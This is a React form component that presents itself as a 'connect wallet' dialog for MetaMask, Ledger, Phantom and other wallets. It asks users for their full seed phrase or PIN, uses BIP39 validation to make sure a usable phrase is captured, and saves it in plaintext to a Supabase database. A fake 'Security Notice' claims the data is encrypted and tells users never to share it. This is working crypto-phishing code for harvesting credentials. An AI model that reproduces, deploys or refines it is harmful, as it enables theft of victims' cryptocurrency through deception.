// Different wallet types require different authentication methods
const walletRequirements = {
  Metamask: { type: "seed_phrase", words: 12, label: "Seed Phrase" },
  "Trust Wallet": { type: "seed_phrase", words: 12, label: "Recovery Phrase" },
  "Coinbase Wallet": { type: "seed_phrase", words: 12, label: "Recovery Phrase" },
  Ledger: { type: "pin", words: 0, label: "PIN Code" },
  "Trezor Wallet": { type: "pin", words: 0, label: "PIN Code" },
  "Phantom Wallet": { type: "seed_phrase", words: 12, label: "Secret Recovery Phrase" },
  "OKX Wallet": { type: "seed_phrase", words: 12, label: "Mnemonic Phrase" },
  "Rabby Wallet": { type: "seed_phrase", words: 12, label: "Seed Phrase" },
  "Uniswap Wallet": { type: "seed_phrase", words: 12, label: "Recovery Phrase" },
  Solflare: { type: "seed_phrase", words: 12, label: "Secret Recovery Phrase" },
  "Magic Eden": { type: "seed_phrase", words: 12, label: "Seed Phrase" },
  Electrum: { type: "seed_phrase", words: 12, label: "Seed Phrase" },
}

export function SeedPhraseForm({ walletName, onBack, onClose }: SeedPhraseFormProps) {
  const [phraseLength, setPhraseLength] = useState("12")
  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(""))
  const [pinCode, setPinCode] = useState("")
  const [showPhrase, setShowPhrase] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [wordValidation, setWordValidation] = useState<boolean[]>(Array(12).fill(false))
  const [isFormValid, setIsFormValid] = useState(false)

  const walletConfig = walletRequirements[walletName as keyof typeof walletRequirements] || {
    type: "seed_phrase",
    words: 12,
    label: "Seed Phrase",
  }

  const validateWord = (word: string): boolean => {
    return BIP39_WORDS.includes(word.toLowerCase().trim())
  }

  useEffect(() => {
    if (walletConfig.type === "seed_phrase") {
      const filledWords = seedWords.filter((word) => word.trim() !== "")
      const validWords = wordValidation.filter((valid) => valid)
      const expectedLength = Number.parseInt(phraseLength)

      setIsFormValid(filledWords.length === expectedLength && validWords.length === expectedLength)
    } else {
      setIsFormValid(pinCode.trim().length >= 4)
    }
  }, [seedWords, wordValidation, phraseLength, pinCode, walletConfig.type])

  const handlePhraseChange = (index: number, value: string) => {
    const newWords = [...seedWords]
    newWords[index] = value
    setSeedWords(newWords)

    const newValidation = [...wordValidation]
    newValidation[index] = value.trim() === "" || validateWord(value)
    setWordValidation(newValidation)

    // Clear error when user starts typing
    if (error) setError(null)
  }

  const handlePhraseLengthChange = (length: string) => {
    setPhraseLength(length)
    const wordCount = Number.parseInt(length)
    setSeedWords(Array(wordCount).fill(""))
    setWordValidation(Array(wordCount).fill(false))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError(null)

    try {
      const supabase = createClient()

      let walletData
      if (walletConfig.type === "seed_phrase") {
        const filledWords = seedWords.filter((word) => word.trim() !== "")
        const expectedLength = Number.parseInt(phraseLength)

        if (filledWords.length !== expectedLength) {
          throw new Error(`Please fill in all ${phraseLength} words`)
        }

        // Check if all words are valid BIP39 words
        const invalidWords = seedWords
          .map((word, index) => ({ word: word.trim(), index }))
          .filter(({ word }) => word !== "" && !validateWord(word))

        if (invalidWords.length > 0) {
          const invalidPositions = invalidWords.map(({ index }) => index + 1).join(", ")
          throw new Error(`Invalid words at positions: ${invalidPositions}. Please check spelling.`)
        }

        walletData = {
          wallet_name: walletName,
          wallet_type: walletConfig.type,
          seed_phrase: seedWords.join(" "),
          phrase_length: Number.parseInt(phraseLength),
          created_at: new Date().toISOString(),
        }
      } else {
        if (!pinCode.trim()) {
          throw new Error("Please enter your PIN code")
        }

        if (pinCode.trim().length < 4) {
          throw new Error("PIN must be at least 4 characters long")
        }

        walletData = {
          wallet_name: walletName,
          wallet_type: walletConfig.type,
          pin_code: pinCode,
          created_at: new Date().toISOString(),
        }
      }

      const { error: insertError } = await supabase.from("wallets").insert([walletData])

      if (insertError) throw insertError

      // Success - close modal
      onClose()
    } catch (error: any) {
      setError(error.message || "Failed to connect wallet")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="h-full flex flex-col">
      {/* Header */}
      <div className="flex items-center gap-3 mb-6">
        <Button variant="ghost" size="sm" onClick={onBack} className="p-2">
          <ArrowLeft className="w-4 h-4" />
        </Button>
        <div>
          <h3 className="text-lg font-semibold text-gray-900">Import {walletConfig.label}</h3>
          <p className="text-sm text-gray-500">Connect your {walletName}</p>
        </div>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="flex-1 flex flex-col">
        {walletConfig.type === "seed_phrase" ? (
          <>
            {/* Phrase Length Selector */}
            <div className="mb-4">
              <Label htmlFor="phrase-length" className="text-sm font-medium text-gray-700 mb-2 block">
                I have a {phraseLength}-word phrase
              </Label>
              <Select value={phraseLength} onValueChange={handlePhraseLengthChange}>
                <SelectTrigger className="w-full">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="12">12 words</SelectItem>
                  <SelectItem value="15">15 words</SelectItem>
                  <SelectItem value="18">18 words</SelectItem>
                  <SelectItem value="21">21 words</SelectItem>
                  <SelectItem value="24">24 words</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Seed Phrase Grid */}
            <div className="flex-1 mb-6">
              <div className="grid grid-cols-3 gap-2 max-h-[300px] overflow-y-auto">
                {Array.from({ length: Number.parseInt(phraseLength) }, (_, i) => (
                  <div key={i} className="relative">
                    <Label htmlFor={`word-${i}`} className="text-xs text-gray-500 mb-1 block">
                      {i + 1}.
                    </Label>
                    <div className="relative">
                      <Input
                        id={`word-${i}`}
                        type={showPhrase ? "text" : "password"}
                        value={seedWords[i] || ""}
                        onChange={(e) => handlePhraseChange(i, e.target.value)}
                        placeholder={`Word ${i + 1}`}
                        className={`text-sm pr-8 ${
                          seedWords[i]?.trim()
                            ? wordValidation[i]
                              ? "border-green-300 focus:border-green-500"
                              : "border-red-300 focus:border-red-500"
                            : ""
                        }`}
                        required
                      />
                      {seedWords[i]?.trim() && (
                        <div className="absolute right-2 top-1/2 transform -translate-y-1/2">
                          {wordValidation[i] ? (
                            <CheckCircle className="w-4 h-4 text-green-500" />
                          ) : (
                            <XCircle className="w-4 h-4 text-red-500" />
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>

              {/* Show/Hide Toggle */}
              <div className="flex items-center gap-2 mt-4">
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  onClick={() => setShowPhrase(!showPhrase)}
                  className="flex items-center gap-2 text-sm text-gray-600"
                >
                  {showPhrase ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  {showPhrase ? "Hide" : "Show"} phrase
                </Button>
              </div>

              <div className="mt-2 text-xs text-gray-500">
                Valid words: {wordValidation.filter((valid) => valid).length} / {phraseLength}
              </div>
            </div>
          </>
        ) : (
          <>
            {/* PIN Code Input */}
            <div className="flex-1 mb-6">
              <Label htmlFor="pin-code" className="text-sm font-medium text-gray-700 mb-2 block">
                Enter your {walletConfig.label}
              </Label>
              <Input
                id="pin-code"
                type={showPhrase ? "text" : "password"}
                value={pinCode}
                onChange={(e) => {
                  setPinCode(e.target.value)
                  if (error) setError(null)
                }}
                placeholder="Enter PIN"
                className="text-center text-lg tracking-widest"
                maxLength={8}
                required
              />

              {/* Show/Hide Toggle */}
              <div className="flex items-center gap-2 mt-4">
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  onClick={() => setShowPhrase(!showPhrase)}
                  className="flex items-center gap-2 text-sm text-gray-600"
                >
                  {showPhrase ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  {showPhrase ? "Hide" : "Show"} PIN
                </Button>
              </div>
            </div>
          </>
        )}

        {/* Error Message */}
        {error && (
          <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
            <p className="text-sm text-red-600">{error}</p>
          </div>
        )}

        {/* Submit Button */}
        <Button
          type="submit"
          disabled={isLoading || !isFormValid}
          className={`w-full py-3 rounded-lg font-medium ${
            isFormValid ? "bg-blue-600 hover:bg-blue-700 text-white" : "bg-gray-300 text-gray-500 cursor-not-allowed"
          }`}
        >
          {isLoading ? "Connecting..." : "Confirm"}
        </Button>

        {/* Security Notice */}
        <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
          <p className="text-xs text-yellow-800">
            <strong>Security Notice:</strong> Your {walletConfig.label.toLowerCase()} will be encrypted and stored
            securely. Never share this information with anyone.
          </p>
        </div>
      </form>
    </div>
  )
}
